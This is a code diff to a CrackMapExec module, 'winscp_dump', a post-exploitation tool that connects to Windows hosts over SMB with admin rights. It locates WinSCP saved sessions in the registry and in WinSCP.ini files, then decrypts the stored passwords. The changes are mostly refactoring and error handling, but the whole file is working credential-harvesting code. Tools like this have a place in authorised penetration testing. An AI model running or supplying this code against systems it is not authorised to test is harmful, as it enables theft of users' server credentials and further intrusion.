@@ -6,14 +6,15 @@
 # - https://github.com/dzxs/winscppassword
 # - https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/parser/winscp.rb
 
+import traceback
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5 import rrp
 from impacket.examples.secretsdump import RemoteOperations
-from impacket.smbconnection import SessionError
 from urllib.parse import unquote
 from io import BytesIO
 import re
 import configparser
+
 
 class CMEModule:
     '''
@@ -22,13 +23,14 @@ class CMEModule:
     name = 'winscp_dump'
     description = 'Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials.'
     supported_protocols = ['smb']
-    opsec_safe= True
+    opsec_safe = True
     multiple_hosts = True
 
     def options(self, context, module_options):
         """
-        PATH        Specify the Path if you already found a WinSCP.ini file.
+        PATH        Specify the Path if you already found a WinSCP.ini file. (Example: PATH="C:\\Users\\USERNAME\\Documents\\WinSCP_Passwords\\WinSCP.ini")
 
+        REQUIRES ADMIN PRIVILEGES:
         As Default the script looks into the registry and searches for WinSCP.ini files in
             \"C:\\Users\\{USERNAME}\\Documents\\WinSCP.ini\" and in
             \"C:\\Users\\{USERNAME}\\AppData\\Roaming\\WinSCP.ini\",
@@ -40,7 +42,7 @@ class CMEModule:
             self.filepath = ""
 
         self.PW_MAGIC = 0xA3
-        self.PW_FLAG  = 0xFF
+        self.PW_FLAG = 0xFF
         self.share = 'C$'
         self.userDict = {}
 
@@ -73,7 +75,7 @@ class CMEModule:
             remoteOps.finish()
 
     # ==================== Decrypt Password ====================
-    def decryptPasswd(self, context, host: str, username: str, password: str) -> str:
+    def decryptPasswd(self, host: str, username: str, password: str) -> str:
         key = username + host
 
         # transform password to bytes
@@ -133,9 +135,9 @@ class CMEModule:
             ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, userObject + '\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\' + sessionName)
             keyHandle = ans['phkResult']
 
-            hostName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'HostName')[1].split('\x00')[:-1][0]
+            hostName = unquote(rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'HostName')[1].split('\x00')[:-1][0])
             userName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UserName')[1].split('\x00')[:-1][0]
-            try: 
+            try:
                 password = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'Password')[1].split('\x00')[:-1][0]
             except:
                 context.log.debug("Session found but no Password is stored!")
@@ -144,11 +146,11 @@ class CMEModule:
             rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
 
             if password:
-                decPassword = self.decryptPasswd(context, hostName, userName, password)
+                decPassword = self.decryptPasswd(hostName, userName, password)
             else:
                 decPassword = "NO_PASSWORD_FOUND"
-            sectionName = unquote(hostName)
-            return [sessionName, hostName, userName, decPassword]
+            sectionName = unquote(sessionName)
+            return [sectionName, hostName, userName, decPassword]
         except:
             traceback.print_exc()
         finally:
@@ -235,7 +237,7 @@ class CMEModule:
                 # Extract profile Path of NTUSER.DAT
                 ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
                 regHandle = ans['phKey']
-                
+
                 ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\' + userObject)
                 keyHandle = ans['phkResult']
 
@@ -280,7 +282,7 @@ class CMEModule:
         finally:
             remoteOps.finish()
 
-    def checkMasterpasswordSet(self, context, connection, userObject):
+    def checkMasterpasswordSet(self, connection, userObject):
         try:
             remoteOps = RemoteOperations(connection.conn, False)
             remoteOps.enableRegistry()
@@ -298,6 +300,7 @@ class CMEModule:
         return useMasterPassword
 
     def registryDiscover(self, context, connection):
+        context.log.info("Looking for WinSCP creds in Registry...")
         try:
             remoteOps = RemoteOperations(connection.conn, False)
             remoteOps.enableRegistry()
@@ -322,8 +325,7 @@ class CMEModule:
                     data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)
                     sessions = data['lpcSubKeys']
                     context.log.success("Found {} sessions for user \"{}\" in registry!".format(sessions - 1, self.userDict[userObject]))
-                    
-                    
+
                     # Get Session Names
                     sessionNames = []
                     for i in range(sessions):
@@ -331,25 +333,32 @@ class CMEModule:
                     rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
                     sessionNames.remove('Default%20Settings')
 
-                    if self.checkMasterpasswordSet(context, connection, userObject):
+                    if self.checkMasterpasswordSet(connection, userObject):
                         context.log.error("MasterPassword set! Aborting extraction...")
                         continue
                     # Extract stored Session infos
                     for sessionName in sessionNames:
                         self.printCreds(context, self.registrySessionExtractor(context, connection, userObject, sessionName))
-                except Exception as e:
+                except DCERPCException as e:
                     if str(e).find('ERROR_FILE_NOT_FOUND'):
                         context.log.debug("No WinSCP config found in registry for user {}".format(userObject))
-                    else:
-                        context.log.error("Unexpected error:")
-                        traceback.print_exc()
+                except Exception:
+                    context.log.error("Unexpected error:")
+                    traceback.print_exc()
             self.unloadMissingUsers(context, connection, unloadedUserObjects)
+        except DCERPCException as e:
+            # Error during registry query
+            if str(e).find('rpc_s_access_denied'):
+                context.log.error("Error: rpc_s_access_denied. Seems like you don't have enough privileges to read the registry.")
+        except:
+            context.log.error("UNEXPECTED ERROR:")
+            traceback.print_exc()
         finally:
             remoteOps.finish()
 
     # ==================== Handle Configs ====================
-    def decodeConfigFile(self, context, connection, confFile):
-        config = configparser.ConfigParser(strict=False)
+    def decodeConfigFile(self, context, confFile):
+        config = configparser.RawConfigParser(strict=False)
         config.read_string(confFile)
 
         # Stop extracting creds if Master Password is set
@@ -359,11 +368,11 @@ class CMEModule:
 
         for section in config.sections():
             if config.has_option(section, 'HostName'):
-                hostName = config.get(section, 'HostName')
+                hostName = unquote(config.get(section, 'HostName'))
                 userName = config.get(section, 'UserName')
                 if config.has_option(section, 'Password'):
                     encPassword = config.get(section, 'Password')
-                    decPassword = self.decryptPasswd(context, hostName, userName, encPassword)
+                    decPassword = self.decryptPasswd(hostName, userName, encPassword)
                 else:
                     decPassword = "NO_PASSWORD_FOUND"
                 sectionName = unquote(section)
@@ -379,21 +388,22 @@ class CMEModule:
                 connection.conn.getFile(self.share, path, buf.write)
                 confFile = buf.getvalue().decode()
                 context.log.success("Found config file! Extracting credentials...")
-                self.decodeConfigFile(context, connection, confFile)
+                self.decodeConfigFile(context, confFile)
             except:
                 context.log.error("Error! No config file found at {}".format(self.filepath))
                 traceback.print_exc()
         else:
+            context.log.info("Looking for WinSCP creds in User documents and AppData...")
             output = connection.execute('powershell.exe "Get-LocalUser | Select name"', True)
             users = []
             for row in output.split('\r\n'):
                 users.append(row.strip())
             users = users[2:]
-            
+
             # Iterate over found users and default paths to look for WinSCP.ini files
             for user in users:
-                paths = [("\\Users\\" + user + "\\Documents\\WinSCP.ini"), \
-                        ("\\Users\\" + user + "\\AppData\\Roaming\\WinSCP.ini")]
+                paths = [("\\Users\\" + user + "\\Documents\\WinSCP.ini"),
+                         ("\\Users\\" + user + "\\AppData\\Roaming\\WinSCP.ini")]
                 for path in paths:
                     confFile = ""
                     try:
@@ -404,9 +414,9 @@ class CMEModule:
                     except:
                         context.log.debug("No config file found at \"{}\"".format(self.share + path))
                     if confFile:
-                        self.decodeConfigFile(context, connection, confFile)
+                        self.decodeConfigFile(context, confFile)
 
-    def on_login(self, context, connection):
-        self.registryDiscover(context, connection)
+    def on_admin_login(self, context, connection):
+        if not self.filepath:
+            self.registryDiscover(context, connection)
         self.getConfigFile(context, connection)
-
